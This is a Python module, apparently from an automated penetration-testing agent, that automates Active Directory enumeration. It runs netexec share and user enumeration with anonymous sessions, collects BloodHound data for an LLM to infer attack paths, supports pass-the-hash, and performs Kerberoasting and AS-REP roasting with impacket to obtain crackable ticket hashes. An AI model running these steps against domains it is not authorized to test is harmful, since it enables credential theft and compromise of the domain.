"""
Active Directory 전용 enumeration. DESIGN.md 8/8-1/8-2절.

리눅스의 scanning.py에 대응하는 AD 버전 - platform == "windows_ad"로 판정된
경우 scanning.py 대신(혹은 이어서) 이 모듈이 실행된다.

**미검증**: 이 랩에는 아직 AD 환경(도메인 컨트롤러+윈도우 멤버 호스트)이 없어서
실전 테스트 전이다. netexec/bloodhound-python/impacket의 문서화된 표준
사용법을 근거로 작성했다 - AD 랩이 준비되면 post_exploit.py(DESIGN.md 21절)
처럼 실측 검증하고, 겪는 버그와 함께 이 주석을 갱신할 것 (DESIGN.md 24절).

BloodHound는 Neo4j 없이 JSON만 수집한다(DESIGN.md 8-2절) - 사람이 그래프를
보는 도구가 아니라 자동화 파이프라인이므로, 수집한 JSON을 그대로 LLM에
텍스트로 넘겨서 공격 경로를 추론하게 한다.
"""

import shlex
import time
from dataclasses import dataclass

from core import config  # noqa: F401 - import 시점에 .env를 로드함 + stdout UTF-8 고정
from core.llm_guard import truncate
from core.state_store import append_finding
from env.guest_control import run_in_kali
from env.job_runner import start_job, wait_for_job

WORKDIR = "/tmp/pentest-agent-ad"


@dataclass
class DomainCredential:
    """AD 인증 정보. 비밀번호와 NTLM 해시 중 하나만 있으면 된다(pass-the-hash)."""
    username: str
    domain: str = ""
    password: str | None = None
    ntlm_hash: str | None = None  # "LM:NT" 형식 (LM은 비어도 됨, 예: ":aad3b435...")


def build_auth_args(cred: DomainCredential | None) -> str:
    """netexec 스타일 인증 인자를 조립한다(뒤에 공백 하나 포함, 이어붙이기 편하게).
    cred가 None이면 빈 문자열 - netexec는 인증 인자 없이도 null/익명 세션을
    시도하므로, 크레덴셜 없이도 새는 정보가 흔하다(DESIGN.md 8-1절)."""
    if cred is None:
        return ""
    parts = [f"-u {shlex.quote(cred.username)}"]
    if cred.ntlm_hash:
        parts.append(f"-H {shlex.quote(cred.ntlm_hash)}")
    else:
        parts.append(f"-p {shlex.quote(cred.password or '')}")
    if cred.domain:
        parts.append(f"-d {shlex.quote(cred.domain)}")
    return " ".join(parts) + " "


def enumerate_domain(engagement_id: str, dc_ip: str, domain: str, cred: DomainCredential | None = None) -> dict:
    """netexec smb 모듈로 공유폴더/도메인 사용자 목록을 훑는다. cred가 None이면
    익명/null 세션으로 시도한다."""
    auth = build_auth_args(cred)
    command = f"netexec smb {dc_ip} {auth}--shares --users 2>&1"
    result = run_in_kali(command, timeout=60)
    append_finding(
        engagement_id, stage="ad_enum", event="netexec_smb_enum", target=dc_ip,
        domain=domain, authenticated=cred is not None,
        raw_output=truncate(result.stdout, 4000),
    )
    return {"raw": result.stdout, "ok": result.ok}


def collect_bloodhound_data(engagement_id: str, dc_ip: str, domain: str, cred: DomainCredential) -> dict:
    """bloodhound-python으로 JSON 데이터만 수집한다(Neo4j 없음 - 8-2절). 도메인
    규모에 따라 오래 걸릴 수 있어 job_runner로 감시한다.

    실전에서 잡은 버그 2개:
    1. `-dc`는 IP가 아니라 호스트명(FQDN)을 요구한다(실측 에러: "The specified
       domain controller ... looks like an IP address, but requires a
       hostname"). `-dc`를 안 주고 `-ns {dc_ip}`(네임서버)만 넘기면
       bloodhound-python이 DNS로 DC를 알아서 찾는다 - IP만 알아도 되게 이
       방식으로 바꿈.
    2. 이 버전의 bloodhound-python에는 출력 **디렉터리** 지정 플래그가 아예
       없다(`--help` 확인함 - `-op/--outputprefix`는 파일명 접두사일 뿐).
       `-o {out_dir}`를 줬더니 에러 없이 조용히 무시되고 결과 파일이 엉뚱한
       곳(대상 디렉터리가 아닌 곳)에 생겼다(실측 - files=[]로 빈 목록이
       나와서 발견함). `-o` 플래그 자체를 빼고 대신 `cd {out_dir} &&`로
       작업 디렉터리를 바꿔서 상대경로로 떨어지게 함."""
    auth = build_auth_args(cred)
    out_dir = f"{WORKDIR}/bloodhound-{int(time.time())}"
    setup = run_in_kali(f"mkdir -p {out_dir}", timeout=15)
    if not setup.ok:
        raise RuntimeError(f"작업 디렉터리 준비 실패: {setup.stderr}")

    command = f"cd {out_dir} && bloodhound-python -d {shlex.quote(domain)} {auth}-ns {dc_ip} -c All --zip"
    job_id = f"bloodhound-{dc_ip}-{int(time.time())}"
    handle = start_job(engagement_id, job_id, command)
    result = wait_for_job(engagement_id, handle, hard_timeout=300)

    listing = run_in_kali(f"ls {out_dir} 2>/dev/null", timeout=15)
    files = listing.stdout.split()
    append_finding(
        engagement_id, stage="ad_enum", event="bloodhound_collected", target=dc_ip,
        domain=domain, output_dir=out_dir, files=files,
        collector_output=truncate(result.output, 2000),
    )
    return {"output_dir": out_dir, "files": files}


def find_kerberoast_targets(engagement_id: str, dc_ip: str, domain: str, cred: DomainCredential) -> str:
    """SPN이 설정된 계정(Kerberoasting 대상)의 크래킹 가능한 TGS 티켓을 요청한다.
    impacket-GetUserSPNs. 원본 출력을 그대로 반환(해시는 hashcat 입력 형식이라
    구조화 파싱 없이 그대로 저장하는 게 안전)."""
    auth = _impacket_auth(cred)
    command = f"impacket-GetUserSPNs {auth} -dc-ip {dc_ip} -request 2>&1"
    result = run_in_kali(command, timeout=60)
    append_finding(
        engagement_id, stage="ad_enum", event="kerberoast_targets", target=dc_ip,
        domain=domain, raw_output=truncate(result.stdout, 4000),
    )
    return result.stdout


def find_asrep_roastable_users(engagement_id: str, dc_ip: str, domain: str, usernames: list[str]) -> str:
    """Kerberos 사전인증이 꺼진 계정(AS-REP roasting 대상)을 찾는다.
    impacket-GetNPUsers - 이건 인증 없이(크레덴셜 없이) 사용자 목록만으로 시도
    가능하다(대상 계정이 사전인증을 안 요구하면 그 자체로 티켓을 내줌)."""
    userfile = f"{WORKDIR}/userlist-{int(time.time())}.txt"
    write = run_in_kali(f"mkdir -p {WORKDIR} && printf '%s\\n' {' '.join(shlex.quote(u) for u in usernames)} > {userfile}", timeout=15)
    if not write.ok:
        raise RuntimeError(f"사용자 목록 파일 준비 실패: {write.stderr}")

    command = f"impacket-GetNPUsers {shlex.quote(domain)}/ -usersfile {userfile} -no-pass -dc-ip {dc_ip} 2>&1"
    result = run_in_kali(command, timeout=60)
    append_finding(
        engagement_id, stage="ad_enum", event="asrep_roast_targets", target=dc_ip,
        domain=domain, usernames_tried=len(usernames), raw_output=truncate(result.stdout, 4000),
    )
    return result.stdout


def _impacket_auth(cred: DomainCredential) -> str:
    """impacket 계열 CLI의 인증 인자 형식: `domain/user:pass` 또는 해시일 때는
    `domain/user -hashes NTHASH`."""
    base = f"{cred.domain}/{cred.username}"
    if cred.ntlm_hash:
        return f"{shlex.quote(base)} -hashes {shlex.quote(cred.ntlm_hash)}"
    return shlex.quote(f"{base}:{cred.password or ''}")


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 3:
        print("usage: python -m modules.ad_enum <engagement_id> <dc_ip> <domain> [username] [password]")
        sys.exit(1)

    eid, dc, dom = sys.argv[1], sys.argv[2], sys.argv[3]
    credential = None
    if len(sys.argv) >= 6:
        credential = DomainCredential(username=sys.argv[4], password=sys.argv[5], domain=dom)

    out = enumerate_domain(eid, dc, dom, credential)
    print(out["raw"])
